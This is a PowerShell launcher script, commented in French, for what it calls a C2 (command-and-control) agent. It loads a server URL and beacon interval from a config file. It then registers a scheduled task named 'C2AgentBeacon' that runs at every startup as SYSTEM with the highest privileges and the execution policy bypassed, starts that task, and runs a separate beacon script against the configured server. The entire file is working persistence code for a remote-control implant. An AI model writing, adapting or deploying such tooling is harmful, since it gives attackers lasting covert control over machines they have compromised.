#Requires -Version 5.0
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Launcher script pour l'agent C2
    Charge la configuration depuis config.json et exécute agent_active.ps1

.DESCRIPTION
    Ce script :
    - Charge le fichier de configuration JSON
    - Extrait les paramètres ServerUrl et BeaconInterval
    - Exécute l'agent principal avec les paramètres appropriés
    - Gère les logs structurés

.NOTES
    Ce script doit être exécuté en tant qu'administrateur
    Emplacement standard : C:\Program Files\C2Agent\launcher.ps1
#>

param(
    [string]$ConfigPath = "$PSScriptRoot\config.json"
)

$ErrorActionPreference = "Stop"

# Fonctions utilitaires
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [string]$LogFile
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # Affichage console
    $color = switch ($Level) {
        "ERROR" { "Red" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        "DEBUG" { "Gray" }
        default { "White" }
    }
    
    Write-Host $logEntry -ForegroundColor $color
    
    # Écriture dans fichier
    if ($LogFile -and (Test-Path (Split-Path -Path $LogFile))) {
        Add-Content -Path $LogFile -Value $logEntry
    }
}

function Load-Configuration {
    param([string]$ConfigPath)
    
    if (-not (Test-Path -Path $ConfigPath)) {
        Write-Log "Configuration file not found: $ConfigPath" "ERROR"
        return $null
    }
    
    try {
        $config = Get-Content -Path $ConfigPath | ConvertFrom-Json
        Write-Log "Configuration loaded successfully from $ConfigPath" "SUCCESS"
        return $config
    }
    catch {
        Write-Log "Failed to parse configuration file: $_" "ERROR"
        return $null
    }
}

function Ensure-LogDirectory {
    param([string]$LogFilePath)
    
    $logDir = Split-Path -Parent -Path $LogFilePath
    
    if (-not (Test-Path -Path $logDir)) {
        try {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
            Write-Log "Created log directory: $logDir" "INFO"
        }
        catch {
            Write-Log "Failed to create log directory: $_" "ERROR"
            return $false
        }
    }
    
    return $true
}

function Expand-EnvironmentVariables {
    param([string]$Path)
    
    # Remplace les variables d'environnement
    return [System.Environment]::ExpandEnvironmentVariables($Path)
}

function Ensure-ScheduledTask {
    param(
        [string]$LauncherPath,
        [string]$LogFilePath
    )
    
    $taskName = "C2AgentBeacon"
    
    Write-Log "Checking scheduled task: $taskName" "INFO" $LogFilePath
    
    # Vérifier si la tâche existe
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    
    if ($existingTask) {
        Write-Log "Scheduled task already exists" "SUCCESS" $LogFilePath
        return $true
    }
    
    Write-Log "Scheduled task does not exist, creating it..." "WARNING" $LogFilePath
    
    try {
        # Créer l'action
        $action = New-ScheduledTaskAction `
            -Execute "powershell.exe" `
            -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$LauncherPath`""
        
        # Créer le trigger (au démarrage de l'ordinateur)
        $trigger = New-ScheduledTaskTrigger -AtStartup
        
        # Paramètres de la tâche
        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -RunOnlyIfNetworkAvailable `
            -MultipleInstances IgnoreNew
        
        # Créer la tâche
        $task = Register-ScheduledTask `
            -TaskName $taskName `
            -Action $action `
            -Trigger $trigger `
            -Settings $settings `
            -RunLevel Highest `
            -User "SYSTEM" `
            -Description "C2 Autonomous Agent - Beacon execution" `
            -ErrorAction Stop
        
        Write-Log "✅ Scheduled task created successfully" "SUCCESS" $LogFilePath
        
        # Test d'exécution
        Write-Log "Starting scheduled task for verification..." "INFO" $LogFilePath
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        
        return $true
    }
    catch {
        Write-Log "Failed to create scheduled task: $_" "ERROR" $LogFilePath
        return $false
    }
}

# ===== SCRIPT PRINCIPAL =====

Write-Host ""
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "        C2 AGENT - Configuration Launcher" -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host ""

# Charger la configuration
$config = Load-Configuration -ConfigPath $ConfigPath

if (-not $config) {
    Write-Log "Cannot continue without valid configuration" "ERROR"
    exit 1
}

# Extraire les paramètres de configuration
$serverUrl = $config.agent.serverUrl
$beaconInterval = $config.agent.beaconInterval
$logFilePath = Expand-EnvironmentVariables $config.agent.logFile

# Créer le répertoire des logs s'il n'existe pas
$logsReady = Ensure-LogDirectory -LogFilePath $logFilePath

if (-not $logsReady) {
    $logFilePath = "$PSScriptRoot\agent.log"
    Write-Log "Using fallback log path: $logFilePath" "WARNING"
}

Write-Log "Server URL: $serverUrl" "INFO" $logFilePath
Write-Log "Beacon Interval: $beaconInterval seconds" "INFO" $logFilePath
Write-Log "Log File: $logFilePath" "INFO" $logFilePath

# Vérifier que le script agent existe
$agentScriptPath = "$PSScriptRoot\agent_active.ps1"

if (-not (Test-Path -Path $agentScriptPath)) {
    Write-Log "Agent script not found: $agentScriptPath" "ERROR" $logFilePath
    exit 1
}

Write-Log "Starting agent..." "INFO" $logFilePath

# Vérifier et créer la tâche planifiée si nécessaire
$taskReady = Ensure-ScheduledTask -LauncherPath $PSCommandPath -LogFilePath $logFilePath

if (-not $taskReady) {
    Write-Log "Warning: Scheduled task could not be created or verified" "WARNING" $logFilePath
}

# Exécuter l'agent avec les paramètres de configuration
try {
    & $agentScriptPath `
        -ServerUrl $serverUrl `
        -BeaconInterval $beaconInterval `
        -LogFile $logFilePath
}
catch {
    Write-Log "Agent execution failed: $_" "ERROR" $logFilePath
    exit 1
}
